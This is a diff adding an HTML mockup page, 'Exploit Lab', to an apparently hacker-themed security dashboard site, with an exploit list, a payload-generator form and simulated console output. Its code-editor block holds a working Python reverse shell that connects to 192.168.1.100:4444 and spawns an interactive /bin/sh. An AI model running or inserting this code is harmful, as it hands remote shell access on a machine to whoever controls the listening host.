@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jeneconk - Exploit Lab</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="matrix-bg"></div>
+    
+    <nav>
+        <div class="logo">
+            <span class="brand">JENECONK</span>
+            <span class="sub">Security Operations Center</span>
+        </div>
+        <ul>
+            <li><a href="index.html">Dashboard</a></li>
+            <li><a href="vulnerability.html">Scanner</a></li>
+            <li><a href="breach-db.html">Breaches</a></li>
+            <li><a href="exploit-lab.html" class="active">Exploits</a></li>
+            <li><a href="evasion-tech.html">Evasion</a></li>
+        </ul>
+        <div class="status-indicator">
+            <span class="dot"></span>
+            LAB MODE
+        </div>
+    </nav>
+
+    <main>
+        <div class="page-header">
+            <h1>💀 Exploit Development Lab</h1>
+            <div class="header-stats">
+                <span>🧪 Environment: Sandbox</span>
+                <span>🔒 Isolated: Yes</span>
+                <span>📚 Exploits: 1,247</span>
+            </div>
+        </div>
+
+        <!-- Lab Grid -->
+        <div class="lab-grid">
+            <!-- Code Editor -->
+            <div class="lab-card editor-card">
+                <div class="lab-card-header">
+                    <span>📝 Exploit Code Editor</span>
+                    <div class="editor-buttons">
+                        <button class="btn-small">Compile</button>
+                        <button class="btn-small">Test</button>
+                        <button class="btn-small danger">Deploy</button>
+                    </div>
+                </div>
+                <div class="code-editor">
+                    <div class="code-line-numbers">
+                        <span>1</span><span>2</span><span>3</span><span>4</span>
+                        <span>5</span><span>6</span><span>7</span><span>8</span>
+                        <span>9</span><span>10</span><span>11</span><span>12</span>
+                        <span>13</span><span>14</span><span>15</span><span>16</span>
+                    </div>
+                    <div class="code-content">
+                        <pre><span class="comment"># Python Reverse Shell Exploit</span>
+<span class="keyword">import</span> socket
+<span class="keyword">import</span> subprocess
+<span class="keyword">import</span> os
+
+<span class="keyword">def</span> <span class="function">reverse_shell</span>(host, port):
+    <span class="comment"># Create socket connection</span>
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    
+    <span class="comment"># Redirect stdin/stdout/stderr</span>
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    
+    <span class="comment"># Spawn interactive shell</span>
+    subprocess.call([<span class="string">"/bin/sh"</span>, <span class="string">"-i"</span>])
+
+<span class="comment"># Target: 192.168.1.100:4444</span>
+<span class="function">reverse_shell</span>(<span class="string">"192.168.1.100"</span>, 4444)</pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Results -->
+            <div class="lab-card results-card">
+                <div class="lab-card-header">
+                    <span>🎯 Exploit Results</span>
+                    <span class="status-badge success">SUCCESS</span>
+                </div>
+                <div class="results-console">
+                    <div class="result-line">[+] Compiling exploit...</div>
+                    <div class="result-line">[+] Connected to target 192.168.1.100</div>
+                    <div class="result-line success">[+] Shell obtained!</div>
+                    <div class="result-line">[+] System: Linux 5.15.0-91-generic</div>
+                    <div class="result-line">[+] Kernel: x86_64</div>
+                    <div class="result-line">[+] User: www-data</div>
+                    <div class="result-line">[+] Privilege: User (www-data)</div>
+                    <div class="result-line blink">[+] Privilege escalation in progress...</div>
+                </div>
+            </div>
+
+            <!-- Exploit Database -->
+            <div class="lab-card db-card">
+                <div class="lab-card-header">
+                    <span>📚 Exploit Database</span>
+                    <span class="badge-count">1,247</span>
+                </div>
+                <div class="exploit-list">
+                    <div class="exploit-entry">
+                        <span class="exploit-name">Metasploit - Apache RCE</span>
+                        <div class="exploit-rating">★★★★★</div>
+                        <span class="exploit-date">2024-01-15</span>
+                    </div>
+                    <div class="exploit-entry">
+                        <span class="exploit-name">Shellshock (CVE-2014-6271)</span>
+                        <div class="exploit-rating">★★★★☆</div>
+                        <span class="exploit-date">2024-01-14</span>
+                    </div>
+                    <div class="exploit-entry">
+                        <span class="exploit-name">Heartbleed (CVE-2014-0160)</span>
+                        <div class="exploit-rating">★★★★★</div>
+                        <span class="exploit-date">2024-01-12</span>
+                    </div>
+                    <div class="exploit-entry">
+                        <span class="exploit-name">Dirty COW (CVE-2016-5195)</span>
+                        <div class="exploit-rating">★★★☆☆</div>
+                        <span class="exploit-date">2024-01-10</span>
+                    </div>
+                    <div class="exploit-entry">
+                        <span class="exploit-name">EternalBlue (MS17-010)</span>
+                        <div class="exploit-rating">★★★★★</div>
+                        <span class="exploit-date">2024-01-08</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Payload Generator -->
+            <div class="lab-card payload-card">
+                <div class="lab-card-header">
+                    <span>⚡ Payload Generator</span>
+                </div>
+                <div class="payload-form">
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Target OS</label>
+                            <select>
+                                <option>Windows</option>
+                                <option selected>Linux</option>
+                                <option>macOS</option>
+                                <option>Android</option>
+                                <option>iOS</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Architecture</label>
+                            <select>
+                                <option>x86</option>
+                                <option selected>x64</option>
+                                <option>ARM</option>
+                                <option>MIPS</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Payload Type</label>
+                            <select>
+                                <option>Reverse Shell</option>
+                                <option selected>Bind Shell</option>
+                                <option>Ransomware</option>
+                                <option>Keylogger</option>
+                                <option>Miner</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Obfuscation Level</label>
+                            <div class="range-container">
+                                <input type="range" min="1" max="10" value="7">
+                                <span class="range-value">7/10</span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="generate-btn">🔧 GENERATE PAYLOAD</button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>© 2024 Jeneconk Security Operations Center • 24/7 Threat Monitoring</p>
+    </footer>
+</body>
+</html>
